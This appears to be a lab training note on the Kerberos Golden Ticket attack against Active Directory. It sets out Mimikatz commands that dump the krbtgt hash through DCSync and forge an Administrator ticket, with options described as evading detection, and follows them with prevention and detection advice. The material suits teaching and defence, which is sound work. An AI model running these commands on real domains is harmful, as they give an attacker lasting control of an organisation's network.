## Description

The Kerberos Golden Ticket is an attack in which threat agents can create or generate tickets for any user in the Domain, effectively acting as a Domain Controller.

When a Domain is created, the unique user account `krbtgt` is created by default; `krbtgt` is a disabled account that cannot be deleted, renamed, or enabled. The Domain Controller's KDC service will use the password of `krbtgt` to derive a key with which it signs all Kerberos tickets. This password's hash is the most trusted object in the entire Domain because it guarantees that the Domain issued Kerberos tickets.

Any user possessing the password's hash of `krbtgt` can create valid Kerberos TGTs. Because `krbtgt` signs them, forged TGTs are considered valid tickets within an environment. Previously, it was even possible to create TGTs for inexistent users and assign any privileges to their accounts. The Golden Ticket attack allows us to escalate rights from any child domain to the parent in the same forest, enabling persistence and control over the domain.

This attack provides elevated persistence in the domain and occurs after an adversary has gained Domain Admin (or similar) privileges.

## Attack

To perform the Golden Ticket attack, use Mimikatz with the following arguments:

- `/domain`: The domain's name.
- `/sid`: The domain's SID value.
- `/rc4`: The password's hash of `krbtgt`.
- `/user`: The username for which Mimikatz will issue the ticket.
- `/id`: Relative ID (last part of SID) for the user for whom Mimikatz will issue the ticket.

Additionally, advanced threat agents specify values for the `/renewmax` and `/endin` arguments to avoid detection:

- `/renewmax`: The maximum number of days the ticket can be renewed.
- `/endin`: End-of-life for the ticket.

### Step 1: Obtain krbtgt Hash and SID

Using DCSync with Rocky's account to obtain the hash:
```
mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt

SAM Username: krbtgt
Hash NTLM: db0d0630064747072a7da3f7c3b4069e
SID: S-1-5-21-1518138621-4282902758-752445584
```

### Step 2: Create Golden Ticket

Run Mimikatz with the `kerberos::golden` command:

```
mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
```

Verifying with `klist`:

```
C:\Mimikatz>klist
```

## Prevention

Preventing forged tickets is challenging, but some preventive steps include:

1. Block privileged users from authenticating to any device.
2. Periodically reset the `krbtgt` password.
3. Enforce `SIDHistory` filtering to prevent cross-domain escalation.

## Detection

Correlate users' behavior to detect abuse of forged tickets, especially looking for:

- Events with ID 4624 and 4625 for suspicious logons.
- TGS requests without a prior TGT, indicating a potential Golden Ticket.
- If `SIDHistory` filtering is enabled, monitor for event ID 4675 for cross-domain escalation.

### Note

If an AD forest is compromised, reset all users' passwords, revoke certificates, and reset `krbtgt`'s password twice to clear any old passwords, with each reset at least 10 hours apart.
```

[Download the Golden_Ticket.md file](sandbox:/mnt/data/Golden_Ticket.md)